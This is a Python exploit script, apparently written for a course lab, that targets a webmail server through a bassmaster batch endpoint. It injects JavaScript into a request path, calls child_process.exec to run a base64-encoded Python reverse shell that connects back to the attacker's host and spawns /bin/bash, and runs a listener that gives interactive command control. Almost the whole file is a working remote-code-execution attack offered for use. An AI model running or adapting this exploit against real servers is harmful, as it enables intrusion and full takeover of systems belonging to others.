#!/usr/bin/python3
import requests, base64, threading, sys, socket, time
code = ""
def post(path):
	print("[+] Sending malicious payload to remote server...".format(code))
	requests.post("http://{}:{}/batch".format(rhost,rport),json={"requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "{}".format(path) }]})

def payload(lhost,lport):
	code = "python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((\"{}\",{}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'".format(lhost,lport)
	b64data = base64.b64encode(code.encode('utf-8'))
	return b64data.decode()

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

if __name__ == "__main__":
	if len(sys.argv) != 5:
		print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT>\n".format(sys.argv[0]))
		print("(+) RHOST - Remote server which runs vulnerable version of ATMAIL")
		print("(+) RPORT - Remote webmail port")
		print("(+) LHOST - Local IP Address to get shell")
		print("(+) LPORT - Local Port to get shell\n")
		sys.exit(-1)
	rhost = sys.argv[1]
	rport = sys.argv[2]
	lhost = sys.argv[3]
	lport = sys.argv[4]

	path = "/item/$0.id; require(\"child_process\").exec(Buffer(\"{}\", \"base64\").toString(\"utf-8\"))".format(payload(lhost,lport)) ##This is path for regular bassmaster
        ## There is no payload for extra_mile bro :) It is not ethical to share it ^-^
	listener_thread = threading.Thread(target=listen, args=(lhost, lport))
	listener_thread.start()
	post(path)
	listener_thread.join()
